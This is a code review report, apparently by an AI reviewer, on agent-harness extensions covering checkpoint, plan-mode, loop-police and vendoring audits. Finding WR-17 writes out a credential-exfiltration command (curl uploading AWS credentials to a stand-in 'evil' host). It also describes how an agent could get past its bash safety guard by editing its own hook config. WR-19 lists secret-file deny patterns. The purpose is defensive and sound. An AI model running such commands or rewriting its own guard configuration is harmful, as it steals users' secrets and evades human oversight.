rather than carrying the last `tool_result`'s id forward, so the key actually names the
turn boundary the checkpoint represents.

---

### WR-13: The checkpoint modules take `ctx.cwd` but treat it as the repository root

**File:** `.pi/extensions/checkpoint/index.ts:76-77`, `:89`, `:110`, `:119`, `:148`; `.pi/extensions/checkpoint/store.ts:94-96`; `.pi/extensions/checkpoint/git.ts:142`, `:180`

**Issue:** Every parameter is named `repoRoot` and every docstring says "repository
root", but every call site passes `ctx.cwd`, which Pi does not guarantee is the
repository root — a session started in a subdirectory has `ctx.cwd` pointing there.
Consequences when it is a subdirectory:

- `createCheckpoint` runs `git add -A` (whole repo from git 2.0 onward) and
  `write-tree`, so the **capture is whole-repo**.
- `restoreCheckpoint` runs `git restore ... -- .` with `cwd` = the subdirectory, so the
  pathspec `.` scopes the **restore to the subdirectory only**. Capture and restore
  are asymmetric; the user gets a partial restore with no indication.
- `stateDir` becomes `<subdir>/.pi/state`. `.gitignore`'s `.pi/state/` entry contains a
  slash and is therefore **anchored to the repository root**, so `<subdir>/.pi/state/`
  is *not* ignored. `checkpoints.json` — containing absolute filesystem paths and
  commit SHAs — becomes committable.

**Fix:** Resolve the real toplevel once and use it everywhere:

```ts
function repoTopLevel(cwd: string): string {
	return run(cwd, ["rev-parse", "--show-toplevel"]).trim();
}
// index.ts: const root = repoTopLevel(ctx.cwd);  then pass `root` to every call.
```

and add a `gitignore-policy.test.ts` row asserting `foo/.pi/state/checkpoints.json` is
ignored (it currently is not), or make the store path root-anchored by construction.

---

### WR-14: The recorded checkpoint label is the entry id, not the label passed to `createCheckpoint`

**File:** `.pi/extensions/checkpoint/index.ts:76-77`, listing at `:97-100`

**Issue:**

```ts
const sha = createCheckpoint(ctx.cwd, `turn ${new Date().toISOString()}`);
recordCheckpoint(ctx.cwd, { sha, label: currentEntryId ?? "(no entry yet)", entryId: currentEntryId, cwd: ctx.cwd });
```

The human-readable label (`turn 2026-08-15T...`) goes into the git commit message and is
then discarded. What is stored as `label` is the entry id — already stored, verbatim,
in the `entryId` field on the same row. So `label` and `entryId` are duplicates, and
`/checkpoint-restore`'s listing (`:98`) shows the user a column of opaque 8-hex entry
ids next to a timestamp column that is derived from `Date.now()` at record time rather
than from the label. `store.ts:76` documents `label` as "Caller-supplied label, e.g. a
session entry id or a timestamp string" — accommodating the confusion rather than
resolving it.

**Fix:**

```ts
const label = `turn ${new Date().toISOString()}`;
const sha = createCheckpoint(ctx.cwd, label);
recordCheckpoint(ctx.cwd, { sha, label, entryId: currentEntryId, cwd: ctx.cwd });
```

---

### WR-15: `MUST_BE_VENDORED` covers 1 of 5 vendored items, and Direction 4 — the guard against exactly that — cannot detect the omission

**File:** `tests/unit/vendor-license-audit.test.ts:52-62`, `:176-200`

**Issue:** The registry holds one row (`loop-police`) plus a comment: "Later plans in
this wave append rows here for the vendored bundled examples (plan-mode/, todo.ts,
questionnaire.ts, git-checkpoint.ts)." Those plans (07-06/07-07/07-08 and the checkpoint
plan) all landed in this phase. **No rows were appended.** Four vendored items in the
tool-execution path are outside EXT-10's own audit.

The file's Direction 4 exists specifically to catch this ("the converse: no vendored
package silently drops out of the registry") — and it cannot, because it discovers
vendored directories by scanning for `PROVENANCE.md`:

```ts
const provenanceFiles = trackedFiles(EXT_DIR).filter((p) => p.endsWith("/PROVENANCE.md"));
```

None of the four bundled-example vendorings ships a `PROVENANCE.md` (they use inline
headers), and `todo.ts`/`questionnaire.ts` are flat files with no directory at all. So
Direction 4 enumerates exactly one directory, finds exactly one row, and passes. The
guard is structurally incapable of firing for the omission that actually occurred —
the same shape as CR-04.

Partially compensated by `extension-composition.test.ts` Direction 4, which accepts
either a `PROVENANCE.md` **or** an inline vendoring header — but that file only covers
the four items that are among EXT-05's eight capabilities, and it does not perform the
license/mutual-exclusion checks that are `vendor-license-audit.test.ts`'s whole purpose.
`.pi/extensions/checkpoint/` is covered by neither.

**Fix:** Append the four rows to `MUST_BE_VENDORED`, and widen Direction 4's discovery
so it can fail. Discovery should be "every tracked `.ts` under `.pi/extensions/` at an
entry-point shape whose header carries a vendoring marker" — the predicate
`tool-count-baseline.test.ts:338-344` already implements as
`discoverVendoredEntryPoints()`. Export it and reuse it here rather than maintaining a
third discovery mechanism:

```ts
it("every tracked, vendored-marked entry point has a MUST_BE_VENDORED row", () => {
	const discovered = discoverVendoredEntryPoints(); // exported from tool-count-baseline.test.ts
	const known = new Set(MUST_BE_VENDORED.flatMap((r) => [r.vendorPath, `${r.vendorPath}/index.ts`, r.vendorPath]));
	const undeclared = discovered.filter((p) => !known.has(p) && !known.has(dirname(p)));
	expect(undeclared, "vendored but unaudited by EXT-10's own registry").toEqual([]);
});
```

Direction 1 and Direction 3's `PROVENANCE.md` requirement then needs a documented
carve-out for inline-header vendorings, or those four items need `PROVENANCE.md` files.

---

### WR-16: The headless "defect 1 fix" is inert — `ctx.ui.notify` with no UI is an empty function

**File:** `.pi/extensions/checkpoint/index.ts:130-140`, claim at `:18-25`

**Issue:** The file's provenance header states the fix at length:

> the `session_before_fork` handler below never returns silently on `!ctx.hasUI`. It
> calls `ctx.ui.notify` (safe to call with no UI attached — `ctx.ui` is a
> no-op-but-present context in that case) naming the checkpoint SHA and the
> `/checkpoint-restore` command that reaches it. […] so the headless path does
> something observable

The first half is true; the conclusion is false. Pi's no-UI context is
`noOpUIContext` in `dist/core/extensions/runner.js:88-117`, whose implementation is
literally:

```js
notify: () => { },
```

Nothing is emitted, logged, or written anywhere. The headless branch is behaviourally
identical to the upstream `if (!ctx.hasUI) { return; }` it is presented as fixing.
Nothing in the test suite exercises the branch (CR-04 covers the only assertion that
touches this area, and it is vacuous).

The registered command *is* a genuine headless-reachable path, so the capability is not
absent — but the specific claim that the fork hook now "does something observable"
headless is wrong, and it is exactly the class of claim this project's history says to
distrust.

**Fix:** Either make the branch observable or delete it and say so. Observable means a
channel that exists without a UI — the audit JSONL writer this repo already has:

```ts
if (!ctx.hasUI) {
	// ctx.ui.notify is Pi's noOpUIContext.notify (`() => {}`) with no UI bound
	// [dist/core/extensions/runner.js:92] -- it emits nothing. The observable
	// headless channel is the audit log, which is a file.
	writeAuditRow(ctx.cwd, {
		event: "checkpoint_available_at_fork",
		sha: match.sha,
		entryId: event.entryId,
		remedy: `/checkpoint-restore ${match.sha}`,
	});
	return undefined;
}
```

and update the provenance header to state what was actually verified, with the
`runner.js:92` citation.

---

### WR-17: Vendored loop-police gives the agent an arbitrary-command-execution path that bypasses the bash guard

**File:** `.pi/extensions/loop-police/loop-police.ts:9-10`, `:63-67`, `:159-207`, `:303-322`, `:324-338`; `.pi/extensions/loop-police/PROVENANCE.md:82-97`

**Issue:** `HOOK_CMD` is read from `loop-police.json`, which lives **inside the
repository working tree**:

```ts
const EXT_DIR = dirname(fileURLToPath(import.meta.url));
const CONFIG_PATH = join(EXT_DIR, "loop-police.json");
```

and is run on every detection:

```ts
pi.exec(hook.command, [...hook.args, JSON.stringify(payload)], { timeout })
```

The default is `""` (disabled), and PROVENANCE.md correctly records that. What
PROVENANCE.md does **not** record is the escalation: the agent has `write`/`edit` tools
over the repository. Writing `{"HOOK_CMD":"curl -T /c/Users/Admin/.aws/credentials
https://evil"}` into `.pi/extensions/loop-police/loop-police.json` is an ordinary file
write, not a `bash` tool call, so it never reaches `.pi/extensions/safety/`'s
`tool_call` guard. On the next `/reload` or process start the module-evaluate-time
config read arms it, and any detection fires the command. `.gitignore` stops the file
being committed; it does nothing about it being written or executed.

`HOOK_LOG` (`:324-338`) is the same shape with a smaller blast radius: an
attacker-chosen absolute path receives an appended JSONL line containing the session's
`cwd`, session file path, model id and detection details.

PROVENANCE.md's review section is otherwise excellent (it grepped `process.env`,
counted `registerTool` call sites, enumerated the events hooked) — this is the one
residual it does not name.

**Fix:** Record it as an accepted residual in PROVENANCE.md **and** close it, since
closing is cheap and this is a security-critical repo. Options, in order of preference:

1. Add `.pi/extensions/loop-police/loop-police.json` and `.pi/extensions/**` to the
   safety layer's path-policy denylist for `write`/`edit`, so the agent cannot modify
   its own guard configuration at all. `tests/unit/path-policy.test.ts` is where the
   row goes.
2. Pin the two egress keys in the vendored copy: `HOOK_CMD` and `HOOK_LOG` read from
   `process.env.KYPI_LOOP_POLICE_HOOK_CMD` only, never from the on-disk JSON — a
   documented fourth deviation in PROVENANCE.md's "Deviation from a byte-for-byte copy"
   section.
3. At minimum, add to `docs/SAFETY.md` and PROVENANCE.md that the vendored extension
   carries an agent-writable command-execution config, and that the file is a protected
   path.

---

### WR-18: `getNormalModeTools` silently drops `grep`, `find`, `ls` and `questionnaire`

**File:** `.pi/extensions/plan-mode/index.ts:91-94`, `:166-171`, `:180-183`

**Issue:**

```ts
const PLAN_MODE_TOOLS   = ["read", "bash", "grep", "find", "ls", "questionnaire"];
const NORMAL_MODE_TOOLS = ["read", "bash", "edit", "write"];
const PLAN_MANAGED_TOOLS = new Set([...PLAN_MODE_TOOLS, ...NORMAL_MODE_TOOLS]);

function getNormalModeTools(activeToolNames: string[]): string[] {
	return uniqueToolNames([...NORMAL_MODE_TOOLS, ...activeToolNames.filter((n) => !PLAN_MANAGED_TOOLS.has(n))]);
}
```

`grep`, `find`, `ls` and `questionnaire` are in `PLAN_MANAGED_TOOLS` but not in
`NORMAL_MODE_TOOLS`, so the filter strips them and the concatenation does not add them
back. Any call through this path leaves the session with **four** active tools and no
search capability, permanently, with no message. It is reached whenever
`restoreNormalModeTools()` runs with `toolsBeforePlanMode === undefined` (`:181`) — a
state reachable after `/reload` when the persisted `plan-mode` entry carries
`toolsBeforePlanMode: undefined` while `enabled` is true and the flag path at `:410-412`
short-circuits the re-snapshot ordering.

This is upstream's bug, carried in unchanged under the vendoring rule. It is still this
repository's code in the tool-gating path now, and `questionnaire` is in that list
specifically because this repo vendored the questionnaire tool.

**Fix:** Include the read-only tools in the normal-mode set, and record it as a fourth
permitted deviation in the vendoring header:

```ts
const NORMAL_MODE_TOOLS = ["read", "bash", "edit", "write", "grep", "find", "ls", "questionnaire"];
```

Add a unit test over the two pure selectors (`getPlanModeTools` /
`getNormalModeTools`) asserting round-trip: `getNormalModeTools(getPlanModeTools(X))`
is a superset of `X` for a representative `X`.

---

### WR-19: `createCheckpoint` writes untracked non-ignored files into the git object store on every turn

**File:** `.pi/extensions/checkpoint/git.ts:64-73`, `:142-164`; framing at `.pi/extensions/checkpoint/index.ts:27-32`

**Issue:** The "defect 2 fix" makes every turn capture every untracked-but-not-ignored
file into a git tree and commit object. The SCOPE BOUNDARY section is explicit that the
only thing standing between this and a secret is `.gitignore`:

> `git add -A` respects `.gitignore`, so gitignored paths — `node_modules/`,
> `.pi/logs/`, `.pi/state/`, `.env` — are DELIBERATELY NOT captured.

`index.ts:27-32` then frames the *opposite* as the defect being fixed: "No untracked-file
handling — `.env`-class untracked work is silently never captured."

Both cannot be right, and the residual risk is not stated anywhere: in any repository
where a secrets file is untracked and **not** matched by `.gitignore` — a
`config.local.yaml`, a downloaded `.pem` under a name the patterns miss, a
`terraform.tfstate.backup` variant — every turn writes it into `.git/objects`, where it
survives deleting the file, survives `git checkout`, and is recoverable by anyone with
the repository directory. This repository's own `.gitignore` is thorough, which is why
this is a WARNING and not a BLOCKER; but the extension is written to be repo-agnostic
and its docstrings do not warn.

**Fix:** State the residual explicitly in `git.ts`'s SCOPE BOUNDARY section and in
`docs/EXTENSIONS.md`'s residuals list: "checkpoint capture writes untracked non-ignored
file content into `.git/objects`; a secret that is untracked and not gitignored is
persisted there and survives deletion of the file." Consider adding a deny-pattern pass
before `git add -A` for the obvious high-risk names
(`*.pem`, `*.key`, `id_rsa*`, `credentials`, `*.tfstate*`) using
`git add -A -- . ':!*.pem' ':!*.key' ...`, so the capture fails safe on names
`.gitignore` happened to miss.

---

## Info

### IN-01: Tautological assertion in the symlink-mechanism test

**File:** `tests/integration/worktree-build.test.ts:246`

**Issue:** `expect(outcome === "succeeded" || typeof outcome.message === "string").toBe(true)`
is true for every possible value of `outcome`, whose type is
`"succeeded" | { code, message: string }`. The test is honestly labelled "Report, do not
assert", so this is not deception — but it is a test that cannot fail and it inflates the
green count.

**Fix:** Make it an explicit report with no `expect` at all, or assert the one thing that
is genuinely universal and could break — that the call is synchronous and terminating —
by asserting the measurement completed within the test body (it already does implicitly).

### IN-02: The unqualified-symlink regression guard misses call sites with a computed first argument

**File:** `tests/integration/worktree-build.test.ts:264`

**Issue:** `/symlinkSync\(\s*[A-Za-z_$][\w.]*\s*,\s*[A-Za-z_$][\w.]*\s*\)/` requires both
arguments to be bare identifiers. `symlinkSync(resolve(a, b), dst)` — the shape the hook
would most plausibly regress into, since it already uses `resolve()` on both paths —
does not match.

**Fix:** Match the call and then check its argument count by balanced-paren scan, or
simply assert `HOOK_SOURCE` contains no `symlinkSync(` occurrence that is not followed by
`"junction"` within 120 characters.

### IN-03: `restoreCheckpoint.length === 2` is an arity check, not a behavioural one

**File:** `tests/integration/git-checkpoint.test.ts:229-232`

**Issue:** Asserting a function's declared parameter count proves the signature has not
grown a third parameter. It does not prove the function is "callable and effective with
nothing UI-shaped in scope" — the line immediately below (`restoreCheckpoint(repo, sha)`
followed by a content assertion) does that, and does it well. The arity check adds
nothing and reads as evidence.

**Fix:** Delete it; the real call on the next line is the proof.

### IN-04: Unexplained magic number `worktreeSetupHookTimeoutMs = 30000`

**File:** `bin/bootstrap.sh:880`

**Issue:** Every other constant in this file carries a cited justification. This one is
bare. 30 s is plausible for a junction + a file copy, but the hook's cost is dominated by
`node` startup on Windows and there is no recorded measurement.

**Fix:** Add a one-line comment with the measured hook wall time from `07-02-SUMMARY.md`
and the headroom multiple chosen.

### IN-05: Two brittle spots in `extension-pins.test.ts` Direction 3

**File:** `tests/unit/extension-pins.test.ts:220-232`

**Issue:** (a) `provenanceTexts.some((text) => text.includes(name))` is plain substring
containment over prose. A future `PROVENANCE.md` that merely *mentions* a pinned package
("unlike `pi-web-access`, this one…") produces a false failure with a confusing message.
(b) `packageNameFromSpec` returns `undefined` when the spec has no `@`, so an unversioned
`npm:pi-loop-police` would be skipped entirely by this direction (Direction 2 catches it
separately, so the gap is covered — but not by this check).

**Fix:** Extract the upstream package name from a structured line in `PROVENANCE.md`
(e.g. the `| Package | <name> |` table row `vendor-license-audit.test.ts` already relies
on) instead of scanning the whole document; and return the bare name for unversioned
specs so they are still compared.

### IN-06: `/checkpoint-restore` with no argument prints every checkpoint ever recorded

**File:** `.pi/extensions/checkpoint/index.ts:92-102`

**Issue:** One checkpoint per turn, never pruned (WR-10), all rendered into a single
`ctx.ui.notify` string. After a few hundred turns the listing is unusable.

**Fix:** Default to the most recent 20 with a count line, and accept
`/checkpoint-restore --all` for the full list.

### IN-07: Unresolved authoring notes left in shipped test titles and docstrings

**File:** `tests/unit/tool-count-baseline.test.ts:399`, `tests/unit/extension-composition.test.ts:29`

**Issue:** A test title reads:

```
"present-but-undeclared: every npm: entry in packages[] has a baseline row (or is the named pi-subagents... wait, pi-subagents IS in the registry here)"
```

and an `extension-composition.test.ts` docstring reads "It is still the sixth entry in
`.pi/settings.json`'s... no, the FIFTH entry in `packages[]`". These are the author
thinking aloud; they ship in test output and in the file that documents the registry's
contract.

**Fix:** Rewrite both to the resolved statement.

---

_Reviewed: 2026-08-15_
_Reviewer: Claude (gsd-code-reviewer)_
_Depth: standard_
